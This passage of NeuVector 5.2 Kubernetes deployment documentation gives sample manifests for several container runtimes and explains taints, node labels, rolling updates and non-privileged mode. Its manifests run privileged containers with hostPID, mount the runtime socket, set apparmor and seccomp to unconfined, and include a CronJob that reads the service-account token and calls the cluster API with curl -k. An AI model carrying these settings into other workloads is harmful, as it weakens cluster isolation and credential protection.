template: metadata: labels: app: neuvector-enforcer-pod spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: neuvector/enforcer:5.2.0 securityContext: privileged: true env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules - name: runtime-sock hostPath: path: /run/containerd/containerd.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-scanner-pod image: neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: neuvector/updater:latest imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   Kubernetes v1.19-1.27 with docker Run-time apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: LoadBalancer selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.2.0 env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: neuvector/controller:5.2.0 securityContext: privileged: true readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /var/neuvector name: nv-share readOnly: false - mountPath: /var/run/docker.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: - name: nv-share hostPath: path: /var/neuvector - name: runtime-sock hostPath: path: /var/run/docker.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: neuvector/enforcer:5.2.0 securityContext: privileged: true env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true - mountPath: /var/run/docker.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules - name: runtime-sock hostPath: path: /var/run/docker.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-scanner-pod image: neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: neuvector/updater:latest imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   Kubernetes v1.19-1.27 with Rancher K3s containerd Run-time apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: LoadBalancer selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.2.0 env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: neuvector/controller:5.2.0 securityContext: privileged: true readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /var/neuvector name: nv-share readOnly: false - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: - name: nv-share hostPath: path: /var/neuvector - name: runtime-sock hostPath: path: /run/k3s/containerd/containerd.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: neuvector/enforcer:5.2.0 securityContext: privileged: true env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules - name: runtime-sock hostPath: path: /run/k3s/containerd/containerd.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-scanner-pod image: neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: neuvector/updater:latest imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   Kubernetes v1.19-1.27 with AWS BottleRocket containerd Run-time # neuvector yaml version for 5.x.x AWS Bottlerocket containerd apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: LoadBalancer selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.2.0 env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: neuvector/controller:5.2.0 securityContext: privileged: true readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /var/neuvector name: nv-share readOnly: false - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: - name: nv-share hostPath: path: /var/neuvector - name: runtime-sock hostPath: path: /run/dockershim.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: neuvector/enforcer:5.2.0 securityContext: privileged: true env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules - name: runtime-sock hostPath: path: /run/dockershim.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-scanner-pod image: neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: neuvector/updater:latest imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   Containerd Run-time​  If using the containerd run-time instead of docker, the volumeMounts for controller and enforcer pods in the sample yamls change to:   - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true   And the volumes change from docker.sock to:   - name: runtime-sock hostPath: path: /run/containerd/containerd.sock   For SUSE K3s containerd deployments, change the volumes path to /k3s/:   volumeMounts: ... - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true ... volumes: ... - name: runtime-sock hostPath: path: /run/k3s/containerd/containerd.sock ...   Or for the AWS Bottlerocket OS with containerd:   volumeMounts: ... - mountPath: /run/containerd/containerd.sock name: docker-sock readOnly: true ... volumes: ... - name: docker-sock hostPath: path: /run/dockershim.sock ...   PKS Change  note PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Controller, Enforcer: hostPath: path: /var/vcap/sys/run/docker/docker.sock   Master Node Taints and Tolerations  All taint info must match to schedule Enforcers on nodes. To check the taint info on a node (e.g. Master):  $ kubectl get node taintnodename -o yaml   Sample output:  spec: taints: - effect: NoSchedule key: node-role.kubernetes.io/master # there may be an extra info for taint as below - effect: NoSchedule key: mykey value: myvalue   If there is additional taints as above, add these to the sample yaml tolerations section:  spec: template: spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane # if there is an extra info for taints as above, please add it here. This is required to match all the taint info defined on the taint node. Otherwise, the Enforcer won't deploy on the taint node - effect: NoSchedule key: mykey value: myvalue   ","version":"5.2","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"Kubernetes","url":"/5.2/deploying/kubernetes#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Replace nodename with the appropriate node name (‘kubectl get nodes’). Note: By default Kubernetes will not schedule pods on the master node.  kubectl label nodes nodename nvcontroller=true   Then add a nodeSelector to the yaml file for the Manager and Controller deployment sections. For example:   - mountPath: /host/cgroup name: cgroup-vol readOnly: true nodeSelector: nvcontroller: &quot;true&quot; restartPolicy: Always   To prevent the enforcer from being deployed on a controller node, if it is a dedicated management node (without application containers to be monitored), add a nodeAffinity to the Enforcer yaml section. For example:   app: neuvector-enforcer-pod spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: nvcontroller operator: NotIn values: [&quot;true&quot;] imagePullSecrets:   ","version":"5.2","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"Kubernetes","url":"/5.2/deploying/kubernetes#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 120 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector. If you are updating via Kubernetes you can manually update to a new version with the sample commands below.  Sample Kubernetes Rolling Update​  For upgrades which just need to update to a new image version, you can use this simple approach.  If your Deployment or Daemonset is already running, you can change the yaml file to the new version, then apply the update:  kubectl apply -f &lt;yaml file&gt;   To update to a new version of NeuVector from the command line.  For controller as Deployment (also do for manager)  kubectl set image deployment/neuvector-controller-pod neuvector-controller-pod=neuvector/controller:2.4.1 -n neuvector   For any container as a DaemonSet:  kubectl set image -n neuvector ds/neuvector-enforcer-pod neuvector-enforcer-pod=neuvector/enforcer:2.4.1   To check the status of the rolling update:  kubectl rollout status -n neuvector ds/neuvector-enforcer-pod kubectl rollout status -n neuvector deployment/neuvector-controller-pod   To rollback the update:  kubectl rollout undo -n neuvector ds/neuvector-enforcer-pod kubectl rollout undo -n neuvector deployment/neuvector-controller-pod   ","version":"5.2","tagName":"h3"},{"title":"Expose REST API in Kubernetes​","type":1,"pageTitle":"Kubernetes","url":"/5.2/deploying/kubernetes#expose-rest-api-in-kubernetes","content":" To expose the REST API for access from outside of the Kubernetes cluster, here is a sample yaml file:  apiVersion: v1 kind: Service metadata: name: neuvector-service-rest namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   Please see the Automation section for more info on the REST API.  ","version":"5.2","tagName":"h3"},{"title":"Kubernetes Deployment in Non-Privileged Mode​","type":1,"pageTitle":"Kubernetes","url":"/5.2/deploying/kubernetes#kubernetes-deployment-in-non-privileged-mode","content":" The following instructions can be used to deploy NeuVector without using privileged mode containers. The controller and enforcer deployments should be changed, which is shown in the excerpted snippets below.  Controller (1.19+):  spec: template: metadata: ... annotations: container.apparmor.security.beta.kubernetes.io/neuvector-controller-pod: unconfined # the following line is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-controller-pod: unconfined spec: containers: ... securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK   Enforcer:  spec: template: metadata: annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # this line is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: containers: securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK   The following sample is a complete deployment reference (Kubernetes 1.19+) using the containerd run-time. For docker or other run-times please see the required changes shown after it.  # neuvector yaml version for 5.x.x on containerd runtime apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: LoadBalancer selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: containers: - name: neuvector-manager-pod image: neuvector/manager:&lt;version&gt; env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-controller-pod: unconfined # Add the following for pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-controller-pod: unconfined spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; containers: - name: neuvector-controller-pod image: neuvector/controller:&lt;version&gt; securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /var/neuvector name: nv-share readOnly: false - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: - name: nv-share hostPath: path: /var/neuvector - name: runtime-sock hostPath: path: /run/containerd/containerd.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # Add the following for pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true containers: - name: neuvector-enforcer-pod image: neuvector/enforcer:&lt;version&gt; securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true - mountPath: /run/containerd/containerd.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: 